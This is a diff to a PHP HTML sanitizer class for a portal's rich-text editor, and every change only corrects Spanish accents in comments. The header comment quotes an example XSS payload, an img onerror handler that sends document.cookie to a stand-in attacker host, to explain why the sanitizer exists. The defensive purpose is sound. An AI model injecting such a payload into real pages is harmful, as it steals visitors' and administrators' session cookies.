@@ -8,29 +8,29 @@ use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;
 /**
  * Limpia el HTML que llega de los editores enriquecidos del panel.
  *
- * POR QUE HACE FALTA
+ * POR QUÉ HACE FALTA
  * ------------------
  * Los campos RichEditor de noticias, preguntas frecuentes y proyectos se
- * pintan con {!! !!}, es decir, sin escapar: si no fuera asi, el texto se
- * veria con las etiquetas a la vista.
+ * pintan con {!! !!}, es decir, sin escapar: si no fuera así, el texto se
+ * vería con las etiquetas a la vista.
  *
  * La barra de herramientas del editor limita lo que se puede hacer con el
- * raton, NO lo que llega al servidor. Cualquiera con acceso al panel puede
- * interceptar la peticion y enviar, por ejemplo:
+ * ratón, NO lo que llega al servidor. Cualquiera con acceso al panel puede
+ * interceptar la petición y enviar, por ejemplo:
  *
  *     <img src=x onerror="fetch('//sitio-del-atacante/?c='+document.cookie)">
  *
- * Eso se ejecutaria en el navegador de cada visitante del portal y en el de
+ * Eso se ejecutaría en el navegador de cada visitante del portal y en el de
  * cualquier administrador que abriera esa noticia. Con este saneado, el
  * atributo onerror simplemente no sobrevive al guardado.
  *
- * COMO FUNCIONA
+ * CÓMO FUNCIONA
  * -------------
- * Lista blanca: solo pasan las etiquetas y atributos declarados aqui. Todo lo
- * demas se descarta. Es lo contrario de intentar "buscar lo peligroso", que
+ * Lista blanca: solo pasan las etiquetas y atributos declarados aquí. Todo lo
+ * demás se descarta. Es lo contrario de intentar "buscar lo peligroso", que
  * siempre se queda corto.
  *
- * Se sanea AL GUARDAR (en los modelos), no al mostrar: asi el contenido
+ * Se sanea AL GUARDAR (en los modelos), no al mostrar: así el contenido
  * peligroso no llega siquiera a la base de datos.
  */
 class HtmlSanitizer
@@ -39,7 +39,7 @@ class HtmlSanitizer
 
     /**
      * Etiquetas permitidas en el cuerpo de un contenido, con sus atributos.
-     * Es lo que ofrece la barra del editor, ni mas ni menos.
+     * Es lo que ofrece la barra del editor, ni más ni menos.
      */
     protected static function configurar(): HtmlSanitizerConfig
     {
@@ -75,7 +75,7 @@ class HtmlSanitizer
             ->allowElement('th', ['colspan', 'rowspan', 'scope'])
             ->allowElement('td', ['colspan', 'rowspan'])
             ->allowElement('caption')
-            // Enlaces e imagenes
+            // Enlaces e imágenes
             ->allowElement('a', ['href', 'title', 'target', 'rel'])
             ->allowElement('img', ['src', 'alt', 'title', 'width', 'height'])
             // Contenedores que genera el editor
@@ -85,7 +85,7 @@ class HtmlSanitizer
             ->allowElement('pre')
 
             // Solo estos esquemas de enlace. Deja fuera javascript: y data:,
-            // que son la via clasica para ejecutar codigo desde un href.
+            // que son la vía clásica para ejecutar código desde un href.
             ->allowLinkSchemes(['https', 'http', 'mailto', 'tel'])
             ->allowMediaSchemes(['https', 'http', 'data'])
 
@@ -94,7 +94,7 @@ class HtmlSanitizer
             ->forceAttribute('a', 'rel', 'noopener noreferrer')
 
             // Se descarta el contenido de estas etiquetas, no solo la etiqueta:
-            // si no, el texto de un <script> quedaria suelto en la pagina.
+            // si no, el texto de un <script> quedaría suelto en la página.
             ->dropElement('script')
             ->dropElement('style')
             ->dropElement('iframe')
@@ -106,7 +106,7 @@ class HtmlSanitizer
             ->dropElement('svg')
             ->dropElement('math')
 
-            // Sin limite de longitud: hay documentos institucionales largos.
+            // Sin límite de longitud: hay documentos institucionales largos.
             ->withMaxInputLength(-1);
 
         return $config;
@@ -119,7 +119,7 @@ class HtmlSanitizer
 
     /**
      * Devuelve el HTML limpio. Un null entra y sale como null, para no
-     * convertir campos vacios en cadenas vacias al guardar.
+     * convertir campos vacíos en cadenas vacías al guardar.
      */
     public static function limpiar(?string $html): ?string
     {
